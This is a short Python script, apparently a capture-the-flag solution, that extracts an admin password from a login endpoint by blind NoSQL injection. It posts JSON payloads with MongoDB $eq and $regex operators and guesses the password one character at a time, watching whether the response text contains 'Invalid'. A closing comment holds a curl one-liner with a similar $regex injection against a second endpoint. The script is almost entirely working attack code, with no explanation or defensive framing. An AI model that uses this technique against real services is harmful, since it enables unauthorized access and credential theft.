import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://two.jh2i.com:50030/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','"', '(',')','[',']','\\','/']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False, proxies={'http':'http://127.0.0.1:8080'})
            if 'Invalid' not in r.text:
                print("Found one more char : %s" % (password+c))
                password += c

# curl -d '{ "item": { "$regex": }}' -H 'Content-Type: application/json' http://two.jh2i.com:50007/signin